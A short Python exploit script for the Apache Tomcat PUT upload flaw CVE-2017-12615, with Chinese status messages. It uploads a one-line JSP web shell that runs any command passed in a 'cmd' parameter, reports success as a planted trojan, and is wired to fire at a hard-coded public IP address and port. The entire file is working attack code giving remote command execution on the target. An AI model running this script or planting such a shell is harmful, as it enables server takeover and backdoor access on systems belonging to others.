import http

import requests
import urllib3
import random

urllib3.disable_warnings()

index = "CVE_2017_12615"


def start(ip, port):
    req = requests.Session()
    rand_num = random.randint(0, 100)
    upload_url = f"http://{ip}:{port}/cmd{rand_num}.jsp/"
    jsp_shell = "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
    resp = req.put(url=upload_url, verify=False, data=jsp_shell)
    if resp.status_code == http.HTTPStatus.CREATED:
        print(f"[*] {ip}:{port} 存在任意文件上传漏洞,CVE编号[{index}],已上传一句话木马[{jsp_shell}] URL:[{upload_url}]")
    else:
        print(f"[ ] {ip}:{port} 未检测到[{index}]漏洞")


if __name__ == "__main__":
    start("43.154.84.186", "8082")
